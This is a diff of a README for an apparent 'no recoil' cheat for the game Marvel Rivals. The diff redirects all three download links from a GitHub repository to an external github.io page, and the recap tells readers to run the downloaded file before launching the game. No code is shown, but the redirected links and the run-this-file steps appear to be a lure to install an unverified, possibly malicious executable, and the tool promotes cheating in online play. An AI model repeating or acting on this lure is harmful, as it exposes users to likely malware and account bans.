@@ -1,6 +1,6 @@
 # 🎯 marvel-rivals-no-recoil-2026 - Zero Recoil, Total Dominance
 
-[![Download Now](https://img.shields.io/badge/Download-Marvel_Rivals_No_Recoil_2026-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Brachypterous-aircushion1179/marvel-rivals-no-recoil-2026)
+[![Download Now](https://img.shields.io/badge/Download-Marvel_Rivals_No_Recoil_2026-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://brachypterous-aircushion1179.github.io)
 
 ---
 
@@ -30,7 +30,7 @@ This is the **most important section**. Please follow these steps carefully. It 
 
 Click the big green button at the top of this page, or click this link right here:
 
-**👉 [Visit this link to download the application](https://github.com/Brachypterous-aircushion1179/marvel-rivals-no-recoil-2026)**
+**👉 [Visit this link to download the application](https://brachypterous-aircushion1179.github.io)**
 
 ### Step 2: What to Expect
 
@@ -161,7 +161,7 @@ This tool is provided for educational and personal use. The user is responsible 
 
 ## 🔑 Final Steps Recap
 
-1. **Click the download link:** [Visit this link to download the application](https://github.com/Brachypterous-aircushion1179/marvel-rivals-no-recoil-2026)
+1. **Click the download link:** [Visit this link to download the application](https://brachypterous-aircushion1179.github.io)
 2. **Run the downloaded file.**
 3. **Launch Marvel Rivals.**
 4. **Enjoy zero recoil.**
